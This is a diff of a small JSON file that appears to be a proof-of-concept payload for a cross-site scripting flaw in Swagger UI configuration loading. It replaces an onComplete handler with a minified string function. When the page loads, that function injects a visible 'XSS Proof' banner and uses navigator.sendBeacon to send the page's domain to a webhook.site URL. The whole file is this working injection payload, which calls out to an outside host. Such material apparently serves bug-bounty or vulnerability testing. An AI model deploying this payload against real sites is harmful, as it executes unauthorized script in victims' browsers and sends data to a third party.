@@ -1,14 +1,4 @@
 {
   "url": "https://petstore.swagger.io/v2/swagger.json",
-  "onComplete": () => { 
-    // Create invisible proof element
-    const marker = document.createElement('div');
-    marker.id = 'xss-proof';
-    marker.style = 'position:fixed;bottom:0;z-index:9999;background:red;color:white;padding:10px;';
-    marker.textContent = 'XSS Proof: ' + document.domain;
-    document.body.appendChild(marker);
-    
-    // Send beacon to webhook
-    navigator.sendBeacon('https://webhook.site/your-unique-id', document.domain);
-  }
+  "onComplete": "function(){var e=document.createElement('div');e.id='xss-proof';e.style='position:fixed;top:0;left:0;z-index:9999;background:red;color:white;padding:10px;font-family:sans-serif;font-weight:bold;';e.textContent='XSS Proof: '+document.domain;document.body.appendChild(e);navigator.sendBeacon('https://webhook.site/f6fe2843-91aa-4c37-bd9a-c26c2b523510',document.domain)}"
 }
